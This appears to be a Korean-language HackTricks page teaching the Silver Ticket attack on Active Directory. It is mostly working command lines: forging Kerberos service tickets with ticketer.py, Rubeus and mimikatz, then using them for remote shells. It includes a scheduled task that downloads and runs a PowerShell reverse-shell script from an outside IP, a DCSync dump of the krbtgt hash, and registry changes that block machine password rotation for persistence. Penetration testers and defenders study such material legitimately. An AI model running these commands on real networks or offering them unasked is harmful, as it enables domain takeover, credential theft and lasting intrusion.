# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}

## Silver ticket

**Silver Ticket** 공격은 Active Directory (AD) 환경에서 서비스 티켓을 악용하는 것입니다. 이 방법은 **서비스 계정의 NTLM 해시를 획득하는 것**에 의존하여 티켓 부여 서비스(TGS) 티켓을 위조합니다. 이 위조된 티켓을 사용하여 공격자는 네트워크의 특정 서비스에 접근할 수 있으며, **임의의 사용자를 가장할 수 있습니다**, 일반적으로 관리 권한을 목표로 합니다. 티켓을 위조할 때 AES 키를 사용하는 것이 더 안전하고 덜 탐지된다는 점이 강조됩니다.

> [!WARNING]
> Silver Tickets는 서비스 계정의 **해시**만 필요하므로 Golden Tickets보다 덜 탐지됩니다. 그러나 특정 서비스에 한정됩니다. 또한, 사용자의 비밀번호를 훔치는 것만으로도 가능합니다. 
또한, **SPN**이 있는 계정의 비밀번호를 탈취하면 해당 비밀번호를 사용하여 그 서비스에 대해 임의의 사용자를 가장하는 Silver Ticket을 생성할 수 있습니다.

티켓 제작을 위해 운영 체제에 따라 다양한 도구가 사용됩니다:

### On Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### 윈도우에서
```bash
# Using Rubeus
## /ldap option is used to get domain data automatically
## With /ptt we already load the tickt in memory
rubeus.exe asktgs /user:<USER> [/rc4:<HASH> /aes128:<HASH> /aes256:<HASH>] /domain:<DOMAIN> /ldap /service:cifs/domain.local /ptt /nowrap /printcmd

# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
CIFS 서비스는 피해자의 파일 시스템에 접근하기 위한 일반적인 목표로 강조되지만, HOST 및 RPCSS와 같은 다른 서비스도 작업 및 WMI 쿼리를 위해 악용될 수 있습니다.

## 사용 가능한 서비스

| 서비스 유형                                 | 서비스 실버 티켓                                                        |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell 원격 제어                       | <p>HOST</p><p>HTTP</p><p>운영 체제에 따라:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>경우에 따라 WINRM을 요청할 수 있습니다.</p>     |
| 예약된 작업                                | HOST                                                                       |
| Windows 파일 공유, 또한 psexec            | CIFS                                                                       |
| LDAP 작업, DCSync 포함                     | LDAP                                                                       |
| Windows 원격 서버 관리 도구                | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| 골든 티켓                                  | krbtgt                                                                     |

**Rubeus**를 사용하여 다음 매개변수를 사용하여 **모든** 티켓을 **요청할 수 있습니다**:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### 실버 티켓 이벤트 ID

- 4624: 계정 로그인
- 4634: 계정 로그오프
- 4672: 관리자 로그인

## 지속성

기계가 30일마다 비밀번호를 변경하지 않도록 하려면 `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1`을 설정하거나 `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge`를 30일보다 큰 값으로 설정하여 기계 비밀번호가 변경되어야 하는 회전 주기를 나타낼 수 있습니다.

## 서비스 티켓 악용

다음 예제에서는 티켓이 관리자 계정을 가장하여 검색된다고 가정해 보겠습니다.

### CIFS

이 티켓을 사용하면 **SMB**를 통해 `C$` 및 `ADMIN$` 폴더에 접근할 수 있으며, 노출된 경우 원격 파일 시스템의 일부에 파일을 복사할 수 있습니다.
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
당신은 또한 **psexec**를 사용하여 호스트 내부에서 셸을 얻거나 임의의 명령을 실행할 수 있습니다:

{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

이 권한으로 원격 컴퓨터에서 예약된 작업을 생성하고 임의의 명령을 실행할 수 있습니다:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

이 티켓을 사용하면 **희생자 시스템에서 WMI를 실행할 수 있습니다**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
더 많은 **wmiexec에 대한 정보**는 다음 페이지에서 확인하세요:

{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

winrm을 통해 컴퓨터에 접근하면 **접근할 수** 있으며, PowerShell을 얻을 수도 있습니다:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
다음 페이지를 확인하여 **winrm을 사용하여 원격 호스트에 연결하는 더 많은 방법**을 알아보세요:

{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> 원격 컴퓨터에서 **winrm이 활성화되어 있고 수신 대기 중이어야** 접근할 수 있습니다.

### LDAP

이 권한으로 **DCSync**를 사용하여 DC 데이터베이스를 덤프할 수 있습니다:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**DCSync에 대해 더 알아보기**는 다음 페이지에서 확인하세요:

{{#ref}}
dcsync.md
{{#endref}}


## 참고자료

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)



{{#include ../../banners/hacktricks-training.md}}
